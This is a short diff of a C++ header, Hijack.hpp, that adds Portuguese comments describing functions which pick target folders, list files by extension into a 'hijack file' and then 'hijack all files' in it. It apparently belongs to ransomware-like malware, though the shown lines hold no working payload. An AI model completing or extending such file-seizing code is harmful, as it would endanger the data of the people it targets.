@@ -1,4 +1,4 @@
-// Hijack.hpp
+// Módulo responsável por juntar tudo em um arquivo só
 
 #ifndef HIJACK_HPP
 #define HIJACK_HPP
@@ -12,7 +12,7 @@
 #include "ListDir.hpp"
 #include "BlackList.hpp"
 
-
+// Função responsável por definir a lista de pastas alvo
 std::vector<std::string> Search() {
 	readFileClass file("./Folders.txt");
 	file.read();
@@ -35,7 +35,7 @@ std::vector<std::string> Search() {
 	return response;
 }
 
-
+// Função responsável por criar o arquivo de sequestro
 void FileSearch(std::vector<std::string> Folders) {
 	readFileClass file("./Extensions.txt");
 	file.read();
@@ -71,6 +71,7 @@ void FileSearch(std::vector<std::string> Folders) {
 	}
 }
 
+// Função responsável por sequestrar todos os arquivos presentes no arquivo de sequestro
 void HIJACK() {
 	std::string response;
 
